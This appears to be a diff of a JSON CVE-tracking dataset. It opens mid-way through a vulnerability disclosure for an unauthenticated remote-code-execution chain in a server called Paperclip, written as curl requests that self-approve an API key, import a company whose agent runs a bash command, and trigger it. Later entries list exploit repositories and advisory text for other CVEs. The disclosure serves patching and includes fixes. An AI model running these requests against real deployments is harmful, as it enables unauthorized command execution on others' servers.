-X POST \\\n  -H \"Cookie: <session-cookie>\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Origin: http://<target>:3100\" \\\n  -d '{\"token\":\"<token-from-above>\"}' \\\n  http://<target>:3100/api/cli-auth/challenges/<id>/approve\n```\n\nThe approval handler at `server/src/routes/access.ts:1687-1704` checks that the caller is a board user but does not check whether the approver is the same person who created the challenge:\n\n```typescript\nif (req.actor.type !== \"board\" || (!req.actor.userId && !isLocalImplicit(req))) {\n  throw unauthorized(\"Sign in before approving CLI access\");\n}\n// no check that approver !== creator\nconst userId = req.actor.userId ?? \"local-board\";\nconst approved = await boardAuth.approveCliAuthChallenge(id, req.body.token, userId);\n```\n\nThe `boardApiToken` from step 3 is now a persistent API key tied to our account.\n\n### Step 4: Create a company and deploy an agent via import (authorization bypass)\n\nThis is the critical flaw. The direct company creation endpoint correctly requires instance admin:\n\n`server/src/routes/companies.ts:260-264`:\n```typescript\nrouter.post(\"/\", validate(createCompanySchema), async (req, res) => {\n  assertBoard(req);\n  if (!(req.actor.source === \"local_implicit\" || req.actor.isInstanceAdmin)) {\n    throw forbidden(\"Instance admin required\");\n  }\n});\n```\n\nBut the import endpoint does not:\n\n`server/src/routes/companies.ts:170-176`:\n```typescript\nrouter.post(\"/import\", validate(companyPortabilityImportSchema), async (req, res) => {\n  assertBoard(req);                                     // only checks board type\n  if (req.body.target.mode === \"existing_company\") {\n    assertCompanyAccess(req, req.body.target.companyId);  // only for existing\n  }\n  // NO assertInstanceAdmin for \"new_company\" mode\n  const result = await portability.importBundle(req.body, ...);\n});\n```\n\n`assertInstanceAdmin` isn't even imported in `companies.ts` (line 27 only imports `assertBoard`, `assertCompanyAccess`, `getActorInfo`), while it is imported and used in other route files like `agents.ts`.\n\nThe import also accepts a `.paperclip.yaml` in the bundle that specifies agent adapter configuration. The `process` adapter takes a `command` and `args` and calls `spawn()` directly with zero sandboxing. The import service passes the full `adapterConfig` through without validation (`server/src/services/company-portability.ts:3955-3981`).\n\n```bash\ncurl -s -X POST -H \"Authorization: Bearer <board-api-key>\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Origin: http://<target>:3100\" \\\n  -d '{\n    \"source\": {\"type\": \"inline\", \"files\": {\n      \"COMPANY.md\": \"---\\nname: attacker-corp\\nslug: attacker-corp\\n---\\nx\",\n      \"agents/pwn/AGENTS.md\": \"---\\nkind: agent\\nname: pwn\\nslug: pwn\\nrole: engineer\\n---\\nx\",\n      \".paperclip.yaml\": \"agents:\\n  pwn:\\n    icon: terminal\\n    adapter:\\n      type: process\\n      config:\\n        command: bash\\n        args:\\n          - -c\\n          - id > /tmp/pwned.txt && whoami >> /tmp/pwned.txt\"\n    }},\n    \"target\": {\"mode\": \"new_company\", \"newCompanyName\": \"attacker-corp\"},\n    \"include\": {\"company\": true, \"agents\": true},\n    \"agents\": \"all\"\n  }' \\\n  http://<target>:3100/api/companies/import\n```\n\nReturns the new company ID and agent ID. The attacker now owns a company with a process adapter agent configured to run arbitrary commands.\n\n### Step 5: Trigger the agent\n\n```bash\ncurl -s -X POST -H \"Authorization: Bearer <board-api-key>\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Origin: http://<target>:3100\" \\\n  -d '{}' \\\n  http://<target>:3100/api/agents/<agent-id>/wakeup\n```\n\nThe wakeup handler at `server/src/routes/agents.ts:2073-2085` only checks `assertCompanyAccess`, which passes because the attacker created the company. Paperclip spawns `bash -c \"id > /tmp/pwned.txt && ...\"` as the server's OS user.\n\n### Proof of Concept\n\nI have a self-contained bash script that runs the full chain automatically:\n\n```\n./poc_exploit.sh http://<target>:3100\n```\n\nIt creates a random test account, self-approves a CLI key, imports a company with a process adapter agent, triggers it, and checks for a marker file to confirm execution. Runs in under 30 seconds.\n\n## Impact\n\nAn unauthenticated remote attacker can execute arbitrary commands as the Paperclip server's OS user on any `authenticated` mode deployment with default configuration. This gives them:\n\n- Full filesystem access (read/write as the server user)\n- Access to all data in the Paperclip database\n- Ability to pivot to internal network services\n- Ability to disrupt all agent operations\n\nThe attack is fully automated, requires no user interaction, and works against the default deployment configuration.\n\n## Suggested Fixes\n\n### Critical: Unauthorized board access (the root cause)\n\nThe import bypass is how I got RCE today, but the real problem is that anyone can go from unauthenticated to a fully persistent board user through open signup + self-approve. Even if you fix the import endpoint, the attacker still has a board API key and can:\n\n- Read adapter configurations and internal API structure\n- Approve/reject/request-revision on any company's approvals (these endpoints only check `assertBoard`, not `assertCompanyAccess`)\n- Cancel any company's agent runs (same missing check)\n- Read issue data from any heartbeat run (zero auth on `GET /api/heartbeat-runs/:runId/issues`)\n- Create unlimited accounts for resource exhaustion\n- Wait for the next authorization bug to appear\n\n**These need to be fixed together:**\n\n1. **Disable open registration by default** -- `server/src/config.ts:172`, change `?? false` to `?? true`. Document `PAPERCLIP_AUTH_DISABLE_SIGN_UP` in the deployment guide. Any deployment that wants open signup can opt in explicitly.\n\n2. **Prevent CLI auth self-approval** -- `server/src/routes/access.ts`, around line 1700. Reject when the approving user is the same user who created the challenge. Right now anyone with a session can generate their own persistent API key.\n\n3. **Require email verification** -- `server/src/auth/better-auth.ts:91`, set `requireEmailVerification: true`. At minimum this stops throwaway accounts.\n\n### Critical: Import authorization bypass (the RCE path)\n\n4. **Add `assertInstanceAdmin` to the import endpoint for `new_company` mode** -- `server/src/routes/companies.ts`, lines 161-176. The direct `POST /` creation endpoint already has this check. The import endpoint doesn't. Apply the same check to both `POST /import` and `POST /import/preview`:\n\n```typescript\nassertBoard(req);\nif (req.body.target.mode === \"new_company\") {\n  if (!(req.actor.source === \"local_implicit\" || req.actor.isInstanceAdmin)) {\n    throw forbidden(\"Instance admin required\");\n  }\n} else {\n  assertCompanyAccess(req, req.body.target.companyId);\n}\n```",
     "repos": [
       "https://github.com/bartfroklage/cve-2026-41679"
     ],
-    "updated": "2026-06-17T10:46:59.450000",
+    "updated": "2026-04-27T16:19:05",
     "epss": 2.951
   },
   "CVE-2025-68686": {
@@ -18355,7 +18181,7 @@
     ],
     "description": "An Exposure of Sensitive Information to an Unauthorized Actor vulnerability [CWE-200] vulnerability in Fortinet FortiOS 7.6.0 through 7.6.1, FortiOS 7.4.0 through 7.4.6, FortiOS 7.2 all versions, FortiOS 7.0 all versions, FortiOS 6.4 all versions may allow a remote unauthenticated attacker to bypass the patch developed for the symbolic link persistency mechanism observed in some post-exploit cases, via crafted HTTP requests. An attacker would need first to have compromised the product via another vulnerability, at filesystem level.",
     "repos": [],
-    "updated": "2026-07-27T18:31:25",
+    "updated": "2026-07-28T05:17:04.113000",
     "epss": 1.264
   },
   "CVE-2026-60667": {
@@ -18442,7 +18268,7 @@
           "header_description": "",
           "followers_count": 13,
           "following_count": 0,
-          "statuses_count": 406,
+          "statuses_count": 408,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -18467,6 +18293,68 @@
     "repos": [],
     "updated": null,
     "epss": 0
+  },
+  "CVE-2026-34486": {
+    "cvss3": 7.5,
+    "severity": "HIGH",
+    "epss_severity": "CRITICAL",
+    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/f1af193f36b86dfaa66da05ca3ec2dc05778a728/http/cves/2026/CVE-2026-34486.yaml",
+    "posts": [
+      {
+        "account": {
+          "id": "116920801615827134",
+          "username": "security_crawler_carl",
+          "acct": "security_crawler_carl@infosec.exchange",
+          "display_name": "Security Crawler Carl",
+          "locked": false,
+          "bot": true,
+          "discoverable": true,
+          "indexable": true,
+          "group": false,
+          "created_at": "2026-06-15T00:00:00.000Z",
+          "note": "<p>READ CYBERSECURITY NEWS. DON'T DIE.</p>",
+          "url": "https://infosec.exchange/@security_crawler_carl",
+          "uri": "https://infosec.exchange/ap/users/116755351765233076",
+          "avatar": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/116/920/801/615/827/134/original/95560105509661aa.png",
+          "avatar_static": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/116/920/801/615/827/134/original/95560105509661aa.png",
+          "avatar_description": "",
+          "header": "https://ioc.exchange/headers/original/missing.png",
+          "header_static": "https://ioc.exchange/headers/original/missing.png",
+          "header_description": "",
+          "followers_count": 13,
+          "following_count": 0,
+          "statuses_count": 408,
+          "last_status_at": "2026-08-09",
+          "hide_collections": false,
+          "show_media": true,
+          "show_media_replies": true,
+          "show_featured": true,
+          "feature_approval": {
+            "automatic": [
+              "public"
+            ],
+            "manual": [],
+            "current_user": "automatic"
+          },
+          "emojis": [],
+          "fields": []
+        },
+        "url": "https://infosec.exchange/@security_crawler_carl/117053040387828497",
+        "content": "<p>\ud83c\udfc6 New Achievement! Patch Notes From Hell!</p><p>Version 2026.08 changelog: ADDED \u2014 Chinese-speaking threat actor manually planting reverse shells on Apache Tomcat servers via CVE-2026-34486, itself an incomplete fix for the 9.8-rated CVE-2026-29146. ADDED \u2014 unauthenticated admin account hijacking on N-able's N-central via CVE-2026-18576. ADDED \u2014 critical 9.8-rated remote code execution at root on IBM Langflow via CVE-2026-9198. (1/2)</p>",
+        "created_at": "2026-08-07T07:27:32.000Z"
+      }
+    ],
+    "description": "Missing Encryption of Sensitive Data vulnerability in Apache Tomcat due to the\u00a0fix for CVE-2026-29146 allowing the bypass of the EncryptInterceptor.\n\nThis issue affects Apache Tomcat: 11.0.20, 10.1.53, 9.0.116.\n\nUsers are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117, which fix the issue.",
+    "repos": [
+      "https://github.com/razureink/cve-2026-34486-tomcat_encrypt_bypass_reproduction",
+      "https://github.com/anonmrc/CVE-2026-34486-e-Tomcat-Tribes",
+      "https://github.com/striga-ai/CVE-2026-34486",
+      "https://github.com/AirSkye/CVE-2026-34486-poc",
+      "https://github.com/punitdarji/tomcat-cve-2026-34486",
+      "https://github.com/404-src/CVE-2026-34486"
+    ],
+    "updated": "2026-08-07T12:37:06.283000",
+    "epss": 81.16
   },
   "CVE-2026-29146": {
     "cvss3": 7.5,
@@ -18497,7 +18385,7 @@
           "header_description": "",
           "followers_count": 13,
           "following_count": 0,
-          "statuses_count": 406,
+          "statuses_count": 408,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -18552,7 +18440,7 @@
           "header_description": "",
           "followers_count": 13,
           "following_count": 0,
-          "statuses_count": 406,
+          "statuses_count": 408,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -18575,78 +18463,16 @@
     ],
     "description": "IBM Langflow OSS 1.0.0 through 1.10.0 allows unauthenticated attackers to chain /api/v1/auto_login (mints SUPERUSER tokens to any network caller) with /api/v1/validate/code (executes user code via exec()) to achieve full RCE on default Langflow deployments",
     "repos": [
+      "https://github.com/ywh-jfellus/CVE-2026-9198",
       "https://github.com/0xdak/CVE-2026-9198_exploit",
       "https://github.com/0xgh057r3c0n/CVE-2026-9198",
-      "https://github.com/rmhowe425/PoC-CVE-2026-9198",
-      "https://github.com/ywh-jfellus/CVE-2026-9198"
+      "https://github.com/rmhowe425/PoC-CVE-2026-9198"
     ],
     "updated": "2026-08-04T21:30:25",
     "epss": 17.052999999999997
   },
-  "CVE-2026-34486": {
-    "cvss3": 7.5,
-    "severity": "HIGH",
-    "epss_severity": "CRITICAL",
-    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/f1af193f36b86dfaa66da05ca3ec2dc05778a728/http/cves/2026/CVE-2026-34486.yaml",
-    "posts": [
-      {
-        "account": {
-          "id": "116920801615827134",
-          "username": "security_crawler_carl",
-          "acct": "security_crawler_carl@infosec.exchange",
-          "display_name": "Security Crawler Carl",
-          "locked": false,
-          "bot": true,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2026-06-15T00:00:00.000Z",
-          "note": "<p>READ CYBERSECURITY NEWS. DON'T DIE.</p>",
-          "url": "https://infosec.exchange/@security_crawler_carl",
-          "uri": "https://infosec.exchange/ap/users/116755351765233076",
-          "avatar": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/116/920/801/615/827/134/original/95560105509661aa.png",
-          "avatar_static": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/116/920/801/615/827/134/original/95560105509661aa.png",
-          "avatar_description": "",
-          "header": "https://ioc.exchange/headers/original/missing.png",
-          "header_static": "https://ioc.exchange/headers/original/missing.png",
-          "header_description": "",
-          "followers_count": 13,
-          "following_count": 0,
-          "statuses_count": 406,
-          "last_status_at": "2026-08-09",
-          "hide_collections": false,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "public"
-            ],
-            "manual": [],
-            "current_user": "automatic"
-          },
-          "emojis": [],
-          "fields": []
-        },
-        "url": "https://infosec.exchange/@security_crawler_carl/117053040387828497",
-        "content": "<p>\ud83c\udfc6 New Achievement! Patch Notes From Hell!</p><p>Version 2026.08 changelog: ADDED \u2014 Chinese-speaking threat actor manually planting reverse shells on Apache Tomcat servers via CVE-2026-34486, itself an incomplete fix for the 9.8-rated CVE-2026-29146. ADDED \u2014 unauthenticated admin account hijacking on N-able's N-central via CVE-2026-18576. ADDED \u2014 critical 9.8-rated remote code execution at root on IBM Langflow via CVE-2026-9198. (1/2)</p>",
-        "created_at": "2026-08-07T07:27:32.000Z"
-      }
-    ],
-    "description": "Missing Encryption of Sensitive Data vulnerability in Apache Tomcat due to the\u00a0fix for CVE-2026-29146 allowing the bypass of the EncryptInterceptor.\n\nThis issue affects Apache Tomcat: 11.0.20, 10.1.53, 9.0.116.\n\nUsers are recommended to upgrade to version 11.0.21, 10.1.54 or 9.0.117, which fix the issue.",
-    "repos": [
-      "https://github.com/404-src/CVE-2026-34486",
-      "https://github.com/razureink/cve-2026-34486-tomcat_encrypt_bypass_reproduction",
-      "https://github.com/AirSkye/CVE-2026-34486-poc",
-      "https://github.com/anonmrc/CVE-2026-34486-e-Tomcat-Tribes",
-      "https://github.com/punitdarji/tomcat-cve-2026-34486",
-      "https://github.com/striga-ai/CVE-2026-34486"
-    ],
-    "updated": "2026-06-08T23:28:56",
-    "epss": 81.16
-  },
   "CVE-2026-16633": {
-    "cvss3": 0,
+    "cvss3": null,
     "severity": null,
     "epss_severity": null,
     "nuclei": null,
@@ -18721,9 +18547,9 @@
         "created_at": "2026-08-07T06:00:24.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "### Impact\n\nIf PDF.js is used to load a malicious PDF, and PDF.js is configured with `enableScripting` set to true (which is the default value) and no CSP for disallowing script-src, unrestricted attacker-controlled JavaScript will be executed in the context of the hosting domain.\n\n### Patches\n\n### Workarounds\nSet `enableScripting` to `false` or set a CSP.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-08-06T21:12:27",
     "epss": 0
   },
   "CVE-2025-8088": {
@@ -18778,39 +18604,39 @@
     ],
     "description": "A path traversal vulnerability affecting the Windows version of WinRAR allows the attackers to execute arbitrary code by crafting malicious archive files. This vulnerability was exploited in the wild and was discovered by\u00a0Anton Cherepanov, Peter Ko\u0161in\u00e1r, and Peter Str\u00fd\u010dek\n     from ESET.",
     "repos": [
-      "https://github.com/ghostn4444/CVE-2025-8088",
-      "https://github.com/kitsuneshade/WinRAR-Exploit-Tool---Rust-Edition",
-      "https://github.com/0xAbolfazl/CVE-2025-8088-WinRAR-PathTraversal-PoC",
-      "https://github.com/onlytoxi/CVE-2025-8088-Winrar-Tool",
-      "https://github.com/techcorp/CVE-2025-8088-Exploit",
-      "https://github.com/shaheeryasirofficial/CVE-2025-8088",
-      "https://github.com/Shinkirou789/Cve-2025-8088-WinRar-vulnerability",
-      "https://github.com/lennertdefauw/CVE-2025-8088",
-      "https://github.com/travisbgreen/cve-2025-8088",
-      "https://github.com/ilhamrzr/RAR-Anomaly-Inspector",
-      "https://github.com/AdityaBhatt3010/CVE-2025-8088-WinRAR-Zero-Day-Path-Traversal",
-      "https://github.com/Lewis-Ricardo/Amaranth-Project",
-      "https://github.com/starfallreverie/winrar-exploit",
-      "https://github.com/pentestfunctions/best-CVE-2025-8088",
-      "https://github.com/nhattanhh/CVE-2025-8088",
-      "https://github.com/aldisakti2/CVE-2025-8088-BUILDER-Winrar-Tool",
-      "https://github.com/undefined-name12/CVE-2025-8088-Winrar",
-      "https://github.com/hexsecteam/CVE-2025-8088-Winrar-Tool",
       "https://github.com/walidpyh/CVE-2025-8088",
-      "https://github.com/nuky-alt/CVE-2025-8088",
-      "https://github.com/IsmaelCosma/CVE-2025-8088",
-      "https://github.com/jordan922/CVE-2025-8088",
-      "https://github.com/pentestfunctions/CVE-2025-8088-Multi-Document",
       "https://github.com/hbesljx/CVE-2025-8088-EXP",
-      "https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-",
+      "https://github.com/pescada-dev/-CVE-2025-8088",
+      "https://github.com/shaheeryasirofficial/CVE-2025-8088",
+      "https://github.com/starfallreverie/winrar-exploit",
       "https://github.com/papcaii2004/CVE-2025-8088-WinRAR-builder",
-      "https://github.com/xi0onamdev/WinRAR-CVE-2025-8088-Exploitation-Toolkit",
-      "https://github.com/knight0x07/WinRAR-CVE-2025-8088-PoC-RAR",
+      "https://github.com/hexsecteam/CVE-2025-8088-Winrar-Tool",
+      "https://github.com/kitsuneshade/WinRAR-Exploit-Tool---Rust-Edition",
+      "https://github.com/travisbgreen/cve-2025-8088",
+      "https://github.com/0xAbolfazl/CVE-2025-8088-WinRAR-PathTraversal-PoC",
+      "https://github.com/IsmaelCosma/CVE-2025-8088",
+      "https://github.com/Lewis-Ricardo/Amaranth-Project",
+      "https://github.com/undefined-name12/CVE-2025-8088-Winrar",
+      "https://github.com/techcorp/CVE-2025-8088-Exploit",
+      "https://github.com/Shinkirou789/Cve-2025-8088-WinRar-vulnerability",
       "https://github.com/pexlexity/WinRAR-CVE-2025-8088-Path-Traversal-PoC",
+      "https://github.com/knight0x07/WinRAR-CVE-2025-8088-PoC-RAR",
+      "https://github.com/lennertdefauw/CVE-2025-8088",
+      "https://github.com/nhattanhh/CVE-2025-8088",
+      "https://github.com/nuky-alt/CVE-2025-8088",
+      "https://github.com/xi0onamdev/WinRAR-CVE-2025-8088-Exploitation-Toolkit",
+      "https://github.com/ghostn4444/CVE-2025-8088",
+      "https://github.com/pentestfunctions/CVE-2025-8088-Multi-Document",
       "https://github.com/Syrins/CVE-2025-8088-Winrar-Tool-Gui",
-      "https://github.com/pescada-dev/-CVE-2025-8088"
+      "https://github.com/ilhamrzr/RAR-Anomaly-Inspector",
+      "https://github.com/jordan922/CVE-2025-8088",
+      "https://github.com/aldisakti2/CVE-2025-8088-BUILDER-Winrar-Tool",
+      "https://github.com/pentestfunctions/best-CVE-2025-8088",
+      "https://github.com/onlytoxi/CVE-2025-8088-Winrar-Tool",
+      "https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-",
+      "https://github.com/AdityaBhatt3010/CVE-2025-8088-WinRAR-Zero-Day-Path-Traversal"
     ],
-    "updated": "2025-10-22T00:34:26",
+    "updated": "2026-06-17T10:06:17.243000",
     "epss": 94.551
   },
   "CVE-2025-42999": {
@@ -18922,20 +18748,20 @@
     ],
     "description": "Rejetto HTTP File Server, up to and including version 2.3m, is vulnerable to a template injection vulnerability. This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request. As of the CVE assignment date, Rejetto HFS 2.3m is no longer supported.",
     "repos": [
-      "https://github.com/sandimfz/CVE-2024-23692",
-      "https://github.com/Mr-r00t11/CVE-2024-23692",
-      "https://github.com/verylazytech/CVE-2024-23692",
-      "https://github.com/999gawkboyy/CVE-2024-23692_Exploit",
       "https://github.com/BBD-YZZ/CVE-2024-23692",
+      "https://github.com/sandimfz/CVE-2024-23692",
       "https://github.com/WanLiChangChengWanLiChang/CVE-2024-23692-RCE",
-      "https://github.com/NingXin2002/HFS2.3_poc",
-      "https://github.com/jakabakos/CVE-2024-23692-RCE-in-Rejetto-HFS",
-      "https://github.com/NanoWraith/CVE-2024-23692",
       "https://github.com/Tupler/CVE-2024-23692-exp",
-      "https://github.com/vanboomqi/CVE-2024-23692",
+      "https://github.com/0x20c/CVE-2024-23692-EXP",
+      "https://github.com/NanoWraith/CVE-2024-23692",
+      "https://github.com/Mr-r00t11/CVE-2024-23692",
       "https://github.com/pradeepboo/Rejetto-HFS-2.x-RCE-CVE-2024-23692",
+      "https://github.com/jakabakos/CVE-2024-23692-RCE-in-Rejetto-HFS",
+      "https://github.com/999gawkboyy/CVE-2024-23692_Exploit",
+      "https://github.com/vanboomqi/CVE-2024-23692",
       "https://github.com/wgetnz/hfs2",
-      "https://github.com/0x20c/CVE-2024-23692-EXP"
+      "https://github.com/NingXin2002/HFS2.3_poc",
+      "https://github.com/verylazytech/CVE-2024-23692"
     ],
     "updated": "2025-10-22T00:34:06",
     "epss": 99.471
@@ -19270,7 +19096,7 @@
     ],
     "description": "Improper restriction of communication channel to intended endpoints in Azure SQL Managed Instance allows an unauthorized attacker to elevate privileges over a network.",
     "repos": [],
-    "updated": "2026-08-08T05:17:10.027000",
+    "updated": "2026-08-07T00:31:27",
     "epss": 0.359
   },
   "CVE-2026-66747": {
@@ -19325,7 +19151,7 @@
     ],
     "description": "Zbtlink router firmware ships an embedded remote-control implant, ENDLESSDOORS, present in every published build across the product line. It is the open-source ycsunjane/rctl tool built in as an OpenWrt package (librctl.so), started at boot and run as root under the process name kworker to blend in with the kernel's [kworker/*] threads. It opens no listening port; it phones home over cleartext TCP to a hardcoded command-and-control server (command channel 7000, interactive-shell callback 7001) with no authentication and no transport encryption, re-attempting contact roughly every 35 seconds. Its command handler passes any received string to popen() as uid=0, and a reserved rctlbash command returns an interactive root shell. Because the channel is unauthenticated and cleartext, control is not limited to whoever planted it: any party that answers at the C2 address, occupies the network path (DNS or route hijack), or acquires the hardcoded fallback domain obtains unauthenticated remote code execution as root.",
     "repos": [],
-    "updated": "2026-08-05T12:31:36",
+    "updated": "2026-08-05T15:17:04.690000",
     "epss": 0.579
   },
   "CVE-2025-68260": {
@@ -19357,7 +19183,7 @@
           "header_description": "",
           "followers_count": 514,
           "following_count": 229,
-          "statuses_count": 7638,
+          "statuses_count": 7637,
           "last_status_at": "2026-08-09",
           "hide_collections": false,
           "show_media": true,
@@ -19798,7 +19624,7 @@
     ],
     "description": "Improper authentication in Microsoft Teams allows an authorized attacker to elevate privileges over a network.",
     "repos": [],
-    "updated": "2026-08-07T18:10:54.500000",
+    "updated": "2026-08-07T00:31:33",
     "epss": 0.381
   },
   "CVE-2026-65668": {
@@ -19864,7 +19690,7 @@
     ],
     "description": "Improper access control in Microsoft Purview eDiscovery allows an authorized attacker to elevate privileges over a network.",
     "repos": [],
-    "updated": "2026-08-07T00:31:33",
+    "updated": "2026-08-07T19:01:11.610000",
     "epss": 0.41700000000000004
   },
   "CVE-2026-68823": {
